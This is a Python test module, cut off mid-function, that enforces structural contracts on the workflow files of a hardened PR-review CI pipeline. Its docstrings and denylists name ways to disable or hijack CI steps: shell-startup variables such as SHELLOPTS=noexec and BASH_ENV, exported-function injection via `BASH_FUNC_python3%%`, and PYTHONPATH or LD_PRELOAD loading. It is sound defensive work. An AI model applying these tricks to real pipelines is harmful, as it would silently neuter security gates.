#!/usr/bin/env python3
"""Structural contracts on the two hardened-PR-review workflow files.

The sanitizer suite next door covers the Python. Nothing covered the YAML, and
that is where the two worst defects of this build lived: a job that reads the
PR through the REST API without the scope that endpoint needs, and a job whose
one write capability pointed at a host its own egress allowlist did not permit.
Both are silent — the first 403s only on a private repo, the second only under
`egress-policy: block` — so neither shows up in review by reading the diff.

These are text assertions, deliberately: PyYAML is not available to the runner
and pulling it in to lint two files is a worse trade than a narrow parser.

WHAT THESE TESTS DEFEND AGAINST, because it bounds how far the readers below
have to go. Both files under contract live ONLY on the default branch — a pull
request cannot edit them, and the one file a PR does control, Stage 1, is
authenticated by the `github.event.workflow.path` pin these tests check. So the
adversary here is a MAINTAINER'S ACCIDENT: a plausible edit or reformat that
quietly removes a control. It is not someone hand-crafting YAML to fool a text
reader, and hardening against that was tried — each round of it produced
another legal spelling and no convergence. The readers therefore aim to be
right on the spellings a maintainer writes, and to FAIL CLOSED with a message
naming the reader on ones they do not model. Where that trade is live it is
written down at the reader, and `TestTheReadersPremisesStillHold` pins the
spellings at one place so a reformat is a loud named failure rather than a
quiet mis-read.

Run: python3 -m unittest discover -s scripts/pr_review -t .
"""

from __future__ import annotations

import contextlib
import hashlib
import io
import itertools
import json
import os
import posixpath
import re
import shutil
import subprocess
import sys
import tempfile
import textwrap
import unittest
import unittest.mock
from pathlib import Path


HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE))

# Collected as a test of THIS module, so the suite notices if this file is the
# one deleted. See _suite_manifest for why the guard is shared, not copied.
from _suite_manifest import (  # noqa: E402,F401
    EXPECTED_MODULES,
    run_this_suite,
    TestTheSuiteIsWhole,
)

# Imported, not restated: the rubric contract below has to compare against the
# set the sanitizer actually enforces, or the two drift apart silently.
from extract_verdict import SEVERITIES  # noqa: E402


REPO = Path(__file__).resolve().parents[2]
WORKFLOWS = REPO / ".github" / "workflows"
STAGE1 = WORKFLOWS / "hardened-pr-review.yml"
STAGE2 = WORKFLOWS / "hardened-pr-review-run.yml"
SUITE_CI = WORKFLOWS / "pr-review-scripts-test.yml"
# The guard module itself, copied into a synthesized tree by the preflight test.
HERE_MANIFEST = Path(__file__).resolve().parent / "_suite_manifest.py"
# Set by `test_the_real_entry_point_runs_this_suite_and_passes` in the child it
# spawns, TO THE SPAWNER'S PID. Without it that test recurses forever: the child
# runs the whole suite, which contains the test, which spawns another child. The
# value matters as much as the key — a bare `1` inherited from anywhere else
# disables the test in the parent too, silently.
REENTRY_MARKER = "PR_REVIEW_ENTRY_POINT_CHILD"
RUBRIC = REPO / ".claude" / "skills" / "pr-review-readiness" / "SKILL.md"
HOOK = REPO / ".claude" / "hooks" / "pr_review" / "restrict-write.sh"


def strip_comments(text: str) -> str:
    """Drop whole-line `#` comments so prose cannot satisfy a contract."""
    return "\n".join(ln for ln in text.splitlines() if not ln.lstrip().startswith("#"))


# A job header may carry a TRAILING comment, and that is the same key:
# `  Audit: # dependency audit` declares the job `Audit`. `strip_comments`
# drops only WHOLE-LINE comments, so a header anchored with `:\s*$` matched
# neither the key nor anything under it — a job declared that way escaped
# enumeration completely while the count of the three known jobs still passed,
# and "every job is covered by construction" was false for a second time.
# Measured on this tree: that job could carry `container:` with the suite green.
HEADER_TAIL = r"(?:[ \t]+#.*)?[ \t]*$"


def job_block(text: str, name: str) -> str:
    """The lines of one job, from `  name:` to the next job key at that indent."""
    lines = text.splitlines()
    start = None
    for i, ln in enumerate(lines):
        if re.match(rf"^  {re.escape(name)}:{HEADER_TAIL}", ln):
            start = i
            break
    assert start is not None, f"job {name!r} not found"
    for j in range(start + 1, len(lines)):
        if re.match(rf"^  [A-Za-z_][\w-]*:{HEADER_TAIL}", lines[j]):
            return "\n".join(lines[start:j])
    return "\n".join(lines[start:])


# Job-level keys that introduce execution WITHOUT adding a step, or change what
# executes one. A `services:`/`container:` image runs before step 1;
# `defaults.run` rewrites every step's shell, so an executable test that runs a
# step's body under bash would be measuring a program CI never runs; a job-level
# `uses:` makes the whole job a call to a workflow defined elsewhere.
FORBIDDEN_JOB_KEYS = ("container", "services", "defaults", "uses", "strategy")


def refuse_execution_outside_steps(
    case: unittest.TestCase, text: str, job: str, keys=FORBIDDEN_JOB_KEYS
) -> None:
    """Refuse `keys` at workflow level and on `job`, in every legal spelling.

    TWO SCOPES AND TWO SPELLINGS, each of which has been a measured hole:

    * THE WHOLE FILE at column 0, never the region before `jobs:`. YAML does not
      constrain key order, so a `defaults:` block written AFTER the jobs mapping
      is still workflow-level and a header-only scan cannot see it.
    * QUOTED AND SPACED keys. `"defaults":` and `defaults :` are the same key,
      and a bare `^    defaults:` regex sees neither.

    `continue-on-error` is deliberately NOT in the default list: it is legal and
    ordinary on many jobs. Where it is fatal — a job whose whole purpose is to
    fail — it is refused explicitly at that call site.

    AND IT FAILS CLOSED on the two spellings it cannot model, rather than
    passing them: a job whose keys are not at four spaces (legal YAML, and the
    regexes below assume four), and a quoted key carrying a backslash escape
    (`"\u0064efaults":` decodes to `defaults` and matches nothing here). Both
    were found by review as silent bypasses. Stage 1 is additionally fenced by
    `test_stage1_uses_only_spellings_this_class_can_read`; Stage 2 and the
    suite-CI file have no such grammar test, which is why the check lives here.
    """
    job_block_text = strip_comments(job_block(text, job))
    whole = strip_comments(text)
    body = [ln for ln in job_block_text.splitlines()[1:] if ln.strip()]
    indents = {len(ln) - len(ln.lstrip()) for ln in body}
    case.assertEqual(
        min(indents, default=4),
        4,
        f"the {job!r} job's keys are not at four spaces ({sorted(indents)}); "
        "this reader assumes four, so it would silently see no keys at all.",
    )
    for scope, lines in (
        ("workflow level", whole),
        (f"the {job!r} job", job_block_text),
    ):
        undecodable = [
            ln for ln in lines.splitlines() if re.match(r'^ *"[^"]*\\[^"]*"[ \t]*:', ln)
        ]
        case.assertEqual(
            undecodable,
            [],
            f"{scope} spells a key with a YAML escape ({undecodable}); this "
            "reader compares raw text, so it cannot tell what that key IS.",
        )
    for key in keys:
        case.assertIsNone(
            re.search(rf"(?m)^[\"']?{key}[\"']?[ \t]*:", whole),
            f"`{key}:` is declared at workflow level, which reaches the {job!r} "
            "job without appearing in it.",
        )
        case.assertIsNone(
            re.search(rf"(?m)^    [\"']?{key}[\"']?[ \t]*:", job_block_text),
            f"the {job!r} job declares `{key}:`. That introduces execution, or "
            "changes the interpreter, outside everything the step-level checks "
            "and the executable tests can see.",
        )


# Bash reads these from the ENVIRONMENT at startup, before the first line of a
# `run:` body. `SHELLOPTS=noexec` makes every step in scope parse its script and
# execute none of it while still exiting 0; `BASH_ENV` names a file bash sources
# first, so a step can be made to run a program the step does not contain.
# `BASHOPTS` and `ENV` are the same mechanism under other names.
#
# WHY THE OTHER GUARDS CANNOT SEE IT. These add no step key, so
# `refuse_disabling_keys` is blind; they add no job key that introduces
# execution, so `refuse_execution_outside_steps` is blind; and they do not touch
# the text the executable tests extract, so those keep running the real body
# under their own bash. One `env:` entry at workflow level therefore leaves all
# 320 tests green while CI runs nothing. Measured.
SHELL_STARTUP_ENV = ("SHELLOPTS", "BASHOPTS", "BASH_ENV", "ENV")


def refuse_unsafe_env_keys(
    case: unittest.TestCase, text: str, what: str, allowed: frozenset
) -> None:
    """Every `env:` name in `what`, held to the subset the readers here model.

    A DENYLIST OF NAMES WAS THE WRONG SHAPE, and the round that shipped one had
    it broken the same day: `BASH_FUNC_python3%%: '() { return 0; }'` replaces
    `python3` itself for every step in scope — bash imports exported functions
    from the environment — and it is on nobody's list of dangerous variables.
    So the rule is inverted, as `test_stage1_uses_only_spellings_this_class_can
    _read` already does for grammar: a name must be plain `SCREAMING_SNAKE`,
    which `BASH_FUNC_python3%%` is not, and must not be one of the startup
    variables, which are the legal-looking names that still execute code.

    AND `env:` MUST BE A BLOCK. `env: {SHELLOPTS: noexec}` is a legal flow
    mapping that `indented_blocks` skips entirely — it yields no lines, so a
    scan over its output sees nothing and passes. Measured: one such line on
    the suite job left all 323 tests green while CI executed nothing.

    Scanned over the WHOLE file rather than per job, because `env:` at workflow
    level reaches every job without appearing in one — the same reason
    `refuse_execution_outside_steps` scans column 0.
    """
    inline = [
        ln.strip()
        for ln in strip_comments(text).splitlines()
        if (m := _key_re("env").match(ln.lstrip())) and uncommented(m.group(1))
    ]
    case.assertEqual(
        inline,
        [],
        f"{what} writes an `env:` mapping in flow style ({inline}). Every "
        "reader here is line-oriented, so the names inside it are never "
        "examined by anything.",
    )
    for block in indented_blocks(text, "env"):
        for ln in block:
            # The NAME as written, including characters no variable should
            # have — capturing `[A-Za-z_][\w-]*` would quietly truncate
            # `BASH_FUNC_python3%%` to something that passes.
            m = re.match(r"^\s*[\"']?([^\"':]+?)[\"']?\s*:", ln)
            if not m:
                continue
            name = m.group(1)
            case.assertRegex(
                name,
                r"^[A-Z][A-Z0-9_]*$",
                f"{what} sets an environment name this file does not model "
                f"({name!r}). Bash imports exported FUNCTIONS from the "
                "environment under names like `BASH_FUNC_python3%%`, which "
                "replaces the program a step runs without touching the step.",
            )
            case.assertNotIn(
                name,
                SHELL_STARTUP_ENV,
                f"{what} sets a shell-startup variable ({name!r}). Bash "
                "applies it before the first line of every `run:` body, so a "
                "step can parse without executing, or execute something it "
                "does not contain, while every check here stays green.",
            )
            # AND AN ALLOWLIST, because the dangerous names are not the ones
            # that look dangerous. `PYTHONPATH: pr` makes `python3 trusted/…`
            # import a PR-authored `json.py` ahead of the stdlib, inside the
            # job holding the AWS session; `GIT_CONFIG_GLOBAL: pr/.gitconfig`
            # gives the job's `git` a PR-authored `diff.external`; `LD_PRELOAD`
            # is the classic. All three are plain SCREAMING_SNAKE and on
            # nobody's denylist, which is why Stage 1 has had an allowlist
            # since round 5 and this is now the same rule for the other two.
            case.assertIn(
                name,
                allowed,
                f"{what} sets {name!r}, which this file does not model. Some "
                "ordinary-looking names make an interpreter load code before "
                "the step's own program runs (PYTHONPATH, LD_PRELOAD, "
                "GIT_CONFIG_GLOBAL, PYTHONSTARTUP); decide which this is, "
                "then add it to the allowlist.",
            )


def refuse_disabling_keys(case: unittest.TestCase, step: str, what: str) -> None:
    """Require a step to be UNCONDITIONAL and FATAL, in every legal spelling.

    A gate Actions skips, or whose failure the job tolerates, is not a gate —
    and both were measured as edits that keep every other assertion green. The
    naive `assertNotIn("if:", step)` is not enough either: YAML accepts
    `if : false` and `"continue-on-error": true`, and a substring check sees
    neither. `_key_re` is the reader that already knows those spellings.

    `shell:` is refused for a different reason, and it is the one that makes
    the executable tests honest: it selects the interpreter, so a step that
    quietly became `shell: python3 {0}` would be TESTED by something other than
    what runs it. Stage 1's `ALLOWED_STEP_KEYS` states the same rule.
    """
    for key in ("if", "continue-on-error", "shell"):
        offenders = [
            ln for ln in strip_comments(step).splitlines() if _key_re(key).match(ln)
        ]
        case.assertEqual(
            offenders,
            [],
            f"{what} carries `{key}:` ({offenders}). Actions would skip it, "
            "tolerate its failure, or run it under an interpreter the "
            "executable tests never exercise.",
        )


def _key_re(key: str) -> re.Pattern:
    """Match `key:` however YAML lets it be spelled, capturing the rest.

    Quoted (`"run":`) and block headers carrying an indentation indicator or a
    chomping marker (`|2`, `|-`, `>-`) are all the same key with the same
    scalar content, as is whitespace before the colon. Comparing the line to
    one exact string rejected every one of them — a false RED on a cosmetic
    edit, which is how a contract test earns itself a deletion.
    """
    return re.compile(rf"""^[ \t]*["']?{re.escape(key)}["']?[ \t]*:[ \t]*(.*)$""")


# A block-scalar header: `|`, `>`, either chomping marker, an optional explicit
# indentation indicator in either order, and an optional `!!str` tag — all of
# which name the same string. Shared so the readers below cannot drift into
# disagreeing about what a header looks like.
BLOCK_HEADER = re.compile(r"(?:!!str[ \t]+)?[|>](?:[-+]?\d*|\d*[-+]?)")


def uncommented(raw: str) -> str:
    """Drop a trailing YAML comment — one introduced by WHITESPACE then `#`.

    A bare `str.split("#")` is not that rule, and the difference is a real
    path: `#` with no space before it is part of the scalar, so `trusted#/..`
    is ONE value that normalizes to `.`, while splitting on `#` reported a
    harmless `trusted` and validated that instead of the value.

    QUOTE-AWARE, because `#` inside a quoted scalar is content: truncating
    `"a # b"` to `"a` both corrupts the value and leaves the quotes unbalanced,
    and doing it to a gate expression red a workflow YAML had not changed.

    THE LIMIT: any quote character opens that state, wherever it sits. That is
    right for a scalar that STARTS quoted and for the shell lines this also
    reads (a `#` inside `echo "PR #${N}"` is content), and wrong for a PLAIN
    scalar containing an apostrophe — `O'Brien # note` keeps its comment here
    where YAML would drop it. No value in these files is spelled that way; a
    reader that needs it must be taught, not assumed.
    """
    quote, i = "", 0
    while i < len(raw):
        c = raw[i]
        if quote:
            if c == quote:
                quote = ""
        elif c in "\"'":
            quote = c
        elif c == "#" and (i == 0 or raw[i - 1] in " \t"):
            return raw[:i].strip()
        i += 1
    return raw.strip()


def plain_scalar(raw: str) -> str:
    """A scalar's VALUE, refusing any spelling this reader cannot decode.

    `str.strip("\\"'")` is not unquoting: it eats characters from both ends
    until neither is a quote, so `"'x'"` — whose value really is `'x'`, with
    the apostrophes — came back as `x` and matched a required entry the file
    does not contain. And a DOUBLE-quoted scalar processes escapes, so
    `"\\u0021**"` is the exclusion `!**` while the raw text starts with a
    backslash and passes every check written against the literal.
    """
    v = uncommented(raw)
    if len(v) >= 2 and v[0] == v[-1] and v[0] in "\"'":
        inner = v[1:-1]
        assert v[0] not in inner, f"nested or doubled quote in the scalar {v!r}"
        assert not (v[0] == '"' and "\\" in inner), (
            f"the double-quoted scalar {v!r} carries a backslash escape, which "
            "YAML decodes and this reader does not — teach it, or unquote."
        )
        return inner
    return v


def norm_expr(value: str) -> str:
    """Collapse the whitespace INSIDE every `${{ … }}`, leaving the rest alone.

    Actions resolves `${{github.sha}}` and `${{  github.sha  }}` identically, so
    an equality against one spelling is a false RED on a reformat — and a
    contract test that reds on a cosmetic edit earns itself a deletion. Only the
    expression interior is touched: the surrounding scalar still has to match.

    WHITESPACE RUNS ONLY. `${{ github . sha }}` also evaluates the same and is
    NOT canonicalized here, because removing spaces around a `.` would corrupt
    a string literal that contains one. Such a spelling reds, with the value in
    the message; widen this deliberately rather than by accident.
    """
    return re.sub(
        r"\$\{\{(.*?)\}\}",
        lambda m: "${{ " + " ".join(m.group(1).split()) + " }}",
        value,
        flags=re.S,
    )


# Any mapping key, and the same with a block-scalar header as its value.
_ANY_KEY = re.compile(r"""^([ \t]*)["']?[\w.-]+["']?[ \t]*:(?:[ \t].*|)$""")
_ANY_BLOCK_KEY = re.compile(r"""^[ \t]*["']?([\w.-]+)["']?[ \t]*:[ \t]*(\S.*)$""")


def block_scalars(text: str, key: str) -> list[tuple[str, list[str]]]:
    """Every TOP-LEVEL `key:` block scalar in `text`, as (header, body lines).

    Three rules, each closing a hole a simpler scan left open:

    * Step over every block scalar's BODY. A scanner that walked all lines read
      a step's own shell as YAML — a heredoc whose payload contains `run: |`
      looked like a second key.
    * Step over EVERY scalar's body, not just this key's. An `env:` value
      spelled `EXAMPLE: |` holding an indented `run: |` and a script under it
      impersonated the step's command.
    * Match only at the OUTERMOST key indentation in `text`. Skipping bodies
      does not establish OWNERSHIP: a block scalar genuinely named `run:` but
      nested inside the step's `env:` mapping is not the step's command, and
      with the real `run: ":"` left as a plain scalar the reader extracted the
      decoy and the executable tests passed against a script Actions never
      runs.
    """
    lines = text.splitlines()

    def walk():
        """(indent, key, header, body) for each block scalar, bodies skipped."""
        i = 0
        while i < len(lines):
            m = _ANY_BLOCK_KEY.match(lines[i])
            header = uncommented(m.group(2)) if m else ""
            if not header or not BLOCK_HEADER.fullmatch(header):
                i += 1
                continue
            indent = len(lines[i]) - len(lines[i].lstrip())
            name, body, i = m.group(1), [], i + 1
            while i < len(lines):
                if (
                    lines[i].strip()
                    and len(lines[i]) - len(lines[i].lstrip()) <= indent
                ):
                    break
                body.append(lines[i])
                i += 1
            yield indent, name, header, body

    found = list(walk())
    # The outermost mapping level, measured the same way — over key lines only,
    # with block bodies skipped, so shell text spelled `foo: bar` cannot lower
    # it and hide a nested decoy.
    keys, i = [], 0
    while i < len(lines):
        m = _ANY_BLOCK_KEY.match(lines[i])
        header = uncommented(m.group(2)) if m else ""
        if (k := _ANY_KEY.match(lines[i])) is not None:
            keys.append(len(k.group(1)))
        if not header or not BLOCK_HEADER.fullmatch(header):
            i += 1
            continue
        indent = len(lines[i]) - len(lines[i].lstrip())
        i += 1
        while i < len(lines):
            if lines[i].strip() and len(lines[i]) - len(lines[i].lstrip()) <= indent:
                break
            i += 1
    top = min(keys) if keys else 0
    return [(h, b) for indent, name, h, b in found if name == key and indent == top]


def scalar_block(text: str, key: str) -> str:
    """The body of the one block scalar introduced by `key:`.

    NOT ended on the literal next key, and NOT split on an exact `key: |\\n`.
    `str.split` on a separator that is not present returns the whole remainder
    with no error — or, with the newline attached, raises IndexError — so the
    legal `run: |-`, `run: |2` and `run: | # why` each broke a reader that
    matched one spelling.
    """
    blocks = block_scalars(text, key)
    assert len(blocks) == 1, f"premise changed: {len(blocks)} `{key}` block scalars"
    assert blocks[0][1], f"premise changed: the `{key}` block is empty"
    return "\n".join(blocks[0][1])


# One mapping entry: an unquoted-or-quoted key, a colon, and the rest. The
# grammar in `refuse_unmodelled_spellings` already refuses a space before the
# colon and a quoted KEY, so this is deliberately not more permissive than the
# file it reads.
_MAP_ENTRY = re.compile(r"""^[ \t]*["']?([\w.-]+)["']?[ \t]*:(?:[ \t]+(.*))?$""")


def mapping_items(lines: list[str]) -> dict:
    """A mapping's OWN key/value pairs, decoded — never a nested block's.

    A line-at-a-time scan for `key:` ANYWHERE under a mapping reads the BODY of
    a block scalar as if it were the mapping. `ssh-known-hosts: |` with a
    `ref: <the pull request's head>` line indented beneath it declares no `ref`
    INPUT at all — actions/checkout receives a known-hosts string and falls back
    to its default ref — while a scan matching `ref:` at any depth recorded the
    expected value and passed. The same shape hides a `cancel-in-progress:` line
    inside a `group: |` scalar. So only lines at the mapping's OWN indent count,
    which a block scalar's body can never reach: YAML requires that body to be
    more indented than the key introducing it.

    Values come back through `plain_scalar` then `norm_expr`, so quoting and
    expression respacing are not differences. An entry this reader cannot parse,
    or a duplicate key, ASSERTS rather than being skipped.
    """
    body = [ln for ln in lines if ln.strip() and not ln.lstrip().startswith("#")]
    if not body:
        return {}
    own = min(len(ln) - len(ln.lstrip()) for ln in body)
    out: dict[str, str] = {}
    for i, ln in enumerate(body):
        if len(ln) - len(ln.lstrip()) != own:
            continue
        m = _MAP_ENTRY.match(ln)
        assert m, f"unreadable mapping entry {ln!r}"
        assert m.group(1) not in out, f"duplicate key {m.group(1)!r} in one mapping"
        # AN INLINE VALUE MUST BE THE WHOLE VALUE. Skipping deeper lines is
        # right for a nested mapping (`with:`, `hooks:`) and WRONG for a scalar
        # that continues: YAML folds `path: pr` with a more-indented `/../trusted`
        # beneath it into the single value `pr /../trusted`, which normalizes to
        # the workspace-root sibling — while a first-line reader records `pr`
        # and the exact-mapping comparison above it still matches. A block
        # header (`ref: >-`) takes the lines below as its value the same way.
        # Both are refused rather than guessed at.
        nxt = body[i + 1] if i + 1 < len(body) else ""
        deeper = bool(nxt) and len(nxt) - len(nxt.lstrip()) > own
        assert not (m.group(2) and deeper), (
            f"the entry {ln.strip()!r} has an inline value AND a more-indented "
            f"line under it ({nxt.strip()!r}). YAML folds those into one value "
            "and this reader sees only the first; write the value on one line, "
            "or teach this reader the spelling."
        )
        out[m.group(1)] = norm_expr(plain_scalar(m.group(2) or ""))
    return out


def env_values(text: str, name: str) -> list:
    """Every value bound to `name` in `text`, DECODED.

    Five readers spelled this `^\\s*NAME:\\s*(\\S+)\\s*$`, which reds on a
    trailing comment — the `$` anchor — and keeps the quotes when the value is
    quoted. Both are legal and behaviour-preserving, and the failure message
    each produced then asserted something false: "REVIEW_MODEL is not a
    workflow-level env" about a file that declares one. A contract test that
    reds on a comment, and lies about why, is one an author deletes.
    """
    return [
        norm_expr(plain_scalar(m.group(1)))
        for ln in text.splitlines()
        if (m := _key_re(name).match(ln))
    ]


def step_uses(step: str) -> str:
    """The ACTION a step runs, as a value — `""` when it runs a script.

    Selecting steps by a substring anywhere in their text is not selecting them
    by what they run: `actions/checkout@…` in a step's NAME, or in an inline
    comment, makes an unrelated step read as a checkout, and a legal
    `uses: 'aws-actions/configure-aws-credentials@…'` — quoted, or with a
    second space after the colon — is invisible to a literal split. So the
    value is read off the step's OWN keys, whose column is derived rather than
    assumed, and a step declaring two of them asserts.
    """
    lines = step.splitlines()
    rest = [ln for ln in lines[1:] if ln.strip()]
    own = min((len(ln) - len(ln.lstrip()) for ln in rest), default=0)
    mine = lines[:1] + [ln for ln in rest if len(ln) - len(ln.lstrip()) == own]
    seen = [
        plain_scalar(m.group(1))
        for ln in mine
        if (m := _key_re("uses").match(ln)) and uncommented(m.group(1))
    ]
    assert len(seen) <= 1, f"a step declares {seen} for `uses:`"
    return seen[0] if seen else ""


def steps_using(text: str, action: str) -> list:
    """Every step in `text` whose `uses:` names `action@<something>`."""
    return [
        s
        for s in re.split(r"(?m)^      -(?: |$)", strip_comments(text))[1:]
        if step_uses(s).startswith(action + "@")
    ]


def review_checkouts() -> dict:
    """The review job's checkout steps, keyed by the `path:` they land on.

    The value is the step's WHOLE `with:` mapping, decoded, because these
    inputs are what decide whose code ends up where.
    """
    review = job_block(STAGE2.read_text(), "review")
    out = {}
    for step in steps_using(review, "actions/checkout"):
        inputs = mapping_items(with_block(step))
        assert "path" in inputs, (
            f"a review-job checkout declares no path: {step[:60]!r}"
        )
        assert inputs["path"] not in out, f"two checkouts land on {inputs['path']!r}"
        out[inputs["path"]] = inputs
    return out


def github_outputs(text: str) -> list:
    """Parse a `$GITHUB_OUTPUT` file the way the runner does.

    Two forms are legal — `name=value`, and a heredoc `name<<DELIM` … `DELIM`
    for a multi-line value — and for a repeated key the LAST write is what a
    later step reads. Asserting on `written.split()` modelled neither:
    `} | tr '\\n' ' ' >> "$GITHUB_OUTPUT"` collapses three assignments into ONE
    whose value happens to contain the other two, and
    `printf 'eligible<<END\\nfalse\\nEND\\n'` overrides a `key=value` line a
    startswith-filter was still reading as the final value.

    Anything this reader does not recognise ASSERTS rather than being skipped:
    a shape it cannot parse is a shape it cannot vouch for.
    """
    out, lines, i = [], text.splitlines(), 0
    while i < len(lines):
        ln = lines[i]
        i += 1
        if not ln:
            continue
        if (m := re.fullmatch(r"([^=<]+)<<(\S+)", ln)) is not None:
            key, delim, body = m.group(1), m.group(2), []
            while i < len(lines) and lines[i] != delim:
                body.append(lines[i])
                i += 1
            assert i < len(lines), f"unterminated $GITHUB_OUTPUT heredoc {key!r}"
            i += 1
            out.append((key, "\n".join(body)))
            continue
        assert "=" in ln, f"unreadable $GITHUB_OUTPUT line {ln!r}"
        k, _, v = ln.partition("=")
        out.append((k, v))
    return out


def sole_outputs(case: unittest.TestCase, written: str) -> dict:
    """`github_outputs` as a mapping, refusing a key written more than once."""
    pairs = github_outputs(written)
    keys = [k for k, _ in pairs]
    dupes = sorted({k for k in keys if keys.count(k) > 1})
    case.assertEqual(
        dupes,
        [],
        f"$GITHUB_OUTPUT carries {dupes} more than once ({pairs}); the LAST "
        "write is the value every later step reads, and it need not be the "
        "one this test checked.",
    )
    return dict(pairs)


def run_step(text: str, marker: str, td: str, env: dict, stubs: dict) -> tuple:
    """Extract the `run:` body of the step NAMED `marker` and EXECUTE it.

    Text assertions establish that a guard is written down. Only running it
    establishes that it decides anything: `[[ … ]] || true || { … exit 1; }`
    keeps every literal a reader looks for — the comparison, a standalone `exit
    1` line inside the branch — while the branch is unreachable and the step
    exits 0. Measured, on the artifact-authentication guard.

    THE STEP IS LOCATED BY ITS `- name:` LINE, not by the first occurrence of
    the text. `str.index` matches a comment that merely mentions the step, and
    an earlier step carrying such a comment donates ITS body to the run. The
    entry is bounded at the next sequence marker at step indent whatever key
    introduces it, because `- id: …` opens a sibling step just as `- name:`
    does and a body-hunting extractor would walk into it.

    `stubs` maps a command name to a bash script placed first on PATH. The
    environment is REPLACED rather than extended, so a variable the step reads
    but the caller did not set is an error here rather than a value silently
    inherited from whoever ran the suite. It is NOT a model of a runner's
    environment — callers must pass what the step's own `env:` declares.

    Returns `(CompletedProcess, Path to the step's $GITHUB_OUTPUT)`.
    """
    hits = list(re.finditer(rf"(?m)^      - name: {re.escape(marker)}[ \t]*$", text))
    assert len(hits) == 1, f"{marker!r} names {len(hits)} steps, expected 1"
    rest = text[hits[0].start() :]
    nxt = re.search(r"(?m)^      - ", rest[1:])
    body = textwrap.dedent(
        scalar_block(rest if nxt is None else rest[: nxt.start() + 1], "run")
    )
    bin_dir = Path(td) / "bin"
    bin_dir.mkdir(exist_ok=True)
    for name, script in stubs.items():
        (bin_dir / name).write_text(script)
        (bin_dir / name).chmod(0o755)
    out = Path(td) / "step_output"
    out.write_text("")
    return (
        subprocess.run(
            ["bash", "-c", body],
            capture_output=True,
            text=True,
            cwd=td,
            env={
                "PATH": f"{bin_dir}:/usr/bin:/bin",
                "GITHUB_OUTPUT": str(out),
                **env,
            },
        ),
        out,
    )


# Three DISTINCT stub shas, so an assertion can tell which field a value came
# from. With head and base stubbed to the same digits, reading `.head.sha`
# where the step means `.base.sha` produced an identical recording and an
# identical `compare` call, and nothing could see the difference.
STUB_API_HEAD = "a" * 40
STUB_API_BASE = "b" * 40


# `gh api <endpoint> [--jq FILTER]`, reading the endpoint and the filter out of
# argv IN ANY ORDER, serving the real response SHAPE, and applying the filter
# with real `jq`. A stub that dispatched on `$2` and returned the already-
# extracted value could not tell `--jq '.merge_base_commit.sha'` from no filter
# at all: deleting the flag left this harness green while the step on a runner
# received the whole comparison document and rejected every request. It also
# broke on the legal `gh api --jq F <endpoint>`, where `$2` is `--jq`.
_GH_STUB = """#!/bin/bash
endpoint=""; filter=""
while [ $# -gt 0 ]; do
  case "$1" in
    api) ;;
    --jq|-q) filter="$2"; shift ;;
    -*) ;;
    *) [ -z "$endpoint" ] && endpoint="$1" ;;
  esac
  shift
done
printf '%s\\t%s\\n' "$endpoint" "$filter" >> "$GH_ARGV"
case "$endpoint" in
  */compare/*) body=$COMPARE_JSON ;;
  */pulls/*)   body=$PR_JSON ;;
  *) echo "gh stub: unmodelled endpoint $endpoint" >&2; exit 1 ;;
esac
if [ -n "$filter" ]; then printf '%s' "$body" | jq -r "$filter"
else printf '%s' "$body"; fi
"""


def run_corroboration(
    merge_base: str,
    td: str,
    *,
    api_head: str = STUB_API_HEAD,
    api_head_repo: str = "o/r",
    api_head_ref: str = "b",
    event_head_repo: str = "o/r",
    event_head_branch: str = "b",
):
    """Execute `prepare`'s corroboration step against a stubbed `gh`.

    THE IDENTITIES ARE PARAMETERS, and that is the point. Stubbing the API to
    agree with the event on every field meant no call this harness could make
    ever reached the provenance branch — so deleting that branch outright left
    every test using it green. The defaults agree; the rejection tests disagree
    deliberately, and `api_head` drives the freshness branch.

    The stub RECORDS the endpoint and the `--jq` filter of every call, because
    which endpoint a step asks for, and what it selects out of the answer, are
    as load-bearing as the value it then stores.

    Returns `(CompletedProcess, $GITHUB_OUTPUT path, recorded-calls path)`.
    """
    pr_json = json.dumps(
        {
            "head": {
                "sha": api_head,
                "repo": {"full_name": api_head_repo},
                "ref": api_head_ref,
            },
            "base": {"sha": STUB_API_BASE},
            "draft": False,
            "labels": [{"name": "in progress"}],
            "changed_files": 3,
        }
    )
    # `merge_base` is what `.merge_base_commit.sha` must YIELD, so the literal
    # "null" is served as a JSON null — what the endpoint really returns when
    # the field is absent — rather than as the four-character string.
    sha = None if merge_base == "null" else merge_base
    argv = Path(td) / "gh_calls"
    argv.write_text("")
    proc, out = run_step(
        STAGE2.read_text(),
        "Corroborate the claimed PR against the trusted API",
        td,
        {
            "GH_ARGV": str(argv),
            "COMPARE_JSON": json.dumps({"merge_base_commit": {"sha": sha}}),
            "PR_JSON": pr_json,
            # Declared by the step's own `env:`; `set -u` would otherwise make
            # a legal rewrite that passes it through explicitly fail here only.
            "GH_TOKEN": "stub-token",
            "PR_NUMBER": "1",
            "HEAD_SHA": STUB_API_HEAD,
            "TRIGGER_EVENT": "labeled",
            "REPO": "o/r",
            "EVENT_HEAD_REPO": event_head_repo,
            "EVENT_HEAD_BRANCH": event_head_branch,
            "REVIEW_LABEL": "in progress",
            "DONE_LABEL": "ready for review",
            "MAX_CHANGED_FILES": "100",
        },
        {"gh": _GH_STUB},
    )
    return proc, out, argv


def _scopes(mapping: str) -> str:
    """`scope: level` pairs, decoded and normalized, as `a: x, b: y`.

    Comparing the RAW text meant `{contents: "read"}` — the very permission
    required, quoted — did not equal `contents: read`, and so did quoting the
    key. Both spellings of the mapping, inline and block, arrive here so the
    comparison sees values rather than punctuation.
    """
    pairs = []
    for part in mapping.split(","):
        if not part.strip():
            continue
        k, _, v = part.partition(":")
        pairs.append(f"{plain_scalar(k)}: {plain_scalar(v)}")
    return ", ".join(pairs)


def with_block(step: str) -> list[str]:
    """The lines of a step's `with:` mapping — the action's INPUTS, only.

    `path:` anywhere in the step is not the checkout's `path` input. Moving it
    into the step's `env:` mapping leaves the same key, the same plausible
    value and the same one match, while `actions/checkout` receives no path at
    all and lands on the workspace root — the exact condition two tests here
    exist to forbid.
    """
    lines = step.splitlines()
    hits = [
        i
        for i, ln in enumerate(lines)
        if (m := _key_re("with").match(ln)) and not uncommented(m.group(1))
    ]
    assert len(hits) == 1, f"expected one `with:` mapping in the step, got {len(hits)}"
    i = hits[0]
    indent = len(lines[i]) - len(lines[i].lstrip())
    out = []
    for nxt in lines[i + 1 :]:
        # A COMMENT DOES NOT END A MAPPING, whatever column it sits in. Ending
        # on one truncated `with:` at an ordinary explanatory comment written
        # level with the key, dropping the `path:` under it and reddening two
        # tests over a file YAML reads exactly as before.
        if nxt.lstrip().startswith("#"):
            continue
